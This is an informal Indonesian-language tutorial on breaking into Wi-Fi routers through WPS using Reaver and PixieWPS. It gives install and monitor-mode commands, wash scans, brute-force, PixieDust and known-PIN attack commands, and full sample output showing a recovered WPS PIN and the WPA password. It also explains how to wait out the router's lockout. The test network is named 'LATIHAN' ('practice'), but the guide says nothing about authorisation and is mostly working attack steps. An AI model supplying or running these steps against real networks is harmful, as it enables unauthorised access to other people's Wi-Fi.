# Hack Wi-Fi WPS (Reaver)

## Bahan-Bahan
- PC/Laptop
- OS Linux
- Adapter Wi-Fi (support mode monitor)
- Aircrack-NG suite
- Reaver
- PixieWPS
- Koneksi internet

## Instal Tools

```
sudo apt-get update
sudo apt-get install aircrack-ng reaver pixiewps
```

## Langkah-Langkah

#### 1. Aktifin Mode Monitor

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

#### 2. Scan Wi-Fi WPS

```
sudo wash -i [interface]
```

Output:

```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
9C:C1:72:6B:DF:88    9  -17  2.0  No   RalinkTe  LATIHAN
```

Pastiin status `Lck` nya kaga `Yes`, kalo `Yes` itu artinya WPS target ke lock. Kalo ke lock kaga bisa diserang.

#### 3. Jalanin Serangan

Reaver punya macem-macem jenis serangan:
1. PIN Brute Force Attack
2. PixieDust Attack (via PixieWPS)
3. Known PIN Attack

#### 1. PIN Brute Force Attack

```
sudo reaver -i [interface] -e [essid] -b [bssid] -c [channel] -vv
```

Kalo pas lagi nyerang muncul output kaya gini:

```
[+] Associated with 9C:C1:72:6B:DF:88 (ESSID: LATIHAN)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received WSC NACK
[+] Sending WSC NACK
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
```

Artinya AP target mendukung fitur rate limiting, terus WPS target yang tadinya status `Lck` nya `No` jadi `Yes`.

Coba jalanin `wash` buat mastiin:

```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
9C:C1:72:6B:DF:88    9  -17  2.0  Yes  RalinkTe  LATIHAN
```

Cara ngakalinnya, tunggu dia sampe kaga `Yes` lagi.

#### 2. PixieDust Attack

Kalo serangan pertama gagal, coba pake serangan ini:

```
sudo reaver -i [interface] -e [essid] -b [bssid] -c [channel] -vv -K
```

Kalo muncul kaya gini:

```
[+] Switching wlan0 to channel 9
[?] Restore previous session for 9C:C1:72:6B:DF:88? [n/Y] n
[+] Waiting for beacon from 9C:C1:72:6B:DF:88
[+] Received beacon from 9C:C1:72:6B:DF:88
[+] Vendor: RalinkTe
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
```

Itu masih ke lock WPS nya, tungguin sampe kaga ke lock dulu.

Kalo kondisinya kaga ke lock kaya gini:

```
Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching wlan0 to channel 10
[?] Restore previous session for 9C:C1:72:6B:DF:88? [n/Y] n
[+] Waiting for beacon from 9C:C1:72:6B:DF:88
[+] Received beacon from 9C:C1:72:6B:DF:88
[+] Vendor: RalinkTe
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 9C:C1:72:6B:DF:88 (ESSID: LATIHAN)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
executing pixiewps -e bf5d564fdb05f176c9dd0b8a533f235e6083dd4cc60b06808e1cf6df723b3d7be71b014b4f24c92b0e31dc2479fa579c1790457f6247cad83a40454d92913b0cea43509e2179afd8b65a4dcf4365327ed5c767c70cf195c11f4a173f10e3221b148b32ac3cbeb501d82efb3701efefbdfbd8bb2d506c383f19276a0f027ca67fad0f9cc155370d76b071f649f5f2e387afcddfa25f7dfc36323d015b1fd282d79fb13f91db35f68f981ccfc7bcfe4b77fda42ed1a54c6edc76c7c8cb46d98fd6 -s caecd83ce6a58ae010bf93e602e4a220c656852518f2c259509f2ca51895372f -z 8b077f0062886f61d793bdb379d30bcd06720000fd07cf59ec92f611b4a02bcf -a cf21eb760e1db358e4f9831b12c5ddaee0966c6ef57b383fcd0533ee00be55ad -n dcfcd1608946dc1b04c6c2d4100fb523 -r 2a8ab82b7188ec88afde02d9d729c34e132a0fde63df9c2494f6e043dea0e794a422cff485a6e4062a61ba03acc406a27dc15622156094ac7f4f95b2d0d9b583c03c311005907cefbe280f2e0eb9d67ee04ce5059165250182c2a82c728c96f267217ce72a21b5269c5c59157aec8f3d36969dfe0ec48fd4e9bdaeb1003e428b5119768f82ce0d8fcd8a798ca8623c565a128791d73f3bffcefd166f3b97fdbe4c0e9abd3dd2ea06bae34a8e63d5c1545d9a11fb5cd42cbac7694befe7d6c5bc

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x5bcd80d1
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     6118daefa7be5952b6040e23b115f8a9
 [*] PSK2:     6d97a380c36c8930ec5eb87840ff69ef
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  56468373

 [*] Time taken: 0 s 74 ms

[+] Pixiewps: success: setting pin to 56468373
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Updated P1 array
[+] Updated P2 array
[+] Quitting after pixiewps attack
[+] Pin cracked in 4 seconds
[+] WPS PIN: '56468373'
[+] WPA PSK: '12345678'
[+] AP SSID: 'LATIHAN'
```

- PIN WPS: `56468373`
- Password Wi-Fi `12345678`

#### 3. Known PIN Attack

Nah, kan kita udah berhasil dapetin PIN WPS nya. PIN ini bisa kita pake di waktu mendatang buat crack password Wi-Fi AP target. Kalo sewaktu-waktu AP target ganti password Wi-Fi.

> [!NOTE]
> PIN `56468373` bisa kepake kalo WPS target aktif (kaga ke lock), terus PIN nya kaga diganti (statis).

```
sudo reaver -i [interface] -e [essid] -b [bssid] -c [channel] -p [pin] -vv
```

Output:

```
Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching wlan0 to channel 11
[?] Restore previous session for 9C:C1:72:6B:DF:88? [n/Y] n
[+] Waiting for beacon from 9C:C1:72:6B:DF:88
[+] Received beacon from 9C:C1:72:6B:DF:88
[+] Vendor: RalinkTe
[+] Trying pin "56468373"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 9C:C1:72:6B:DF:88 (ESSID: LATIHAN)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 4 seconds
[+] WPS PIN: '56468373'
[+] WPA PSK: 'modal bang!'
[+] AP SSID: 'LATIHAN'
```

- PIN WPS: `56468373`
- Password Wi-Fi: `modal bang!`
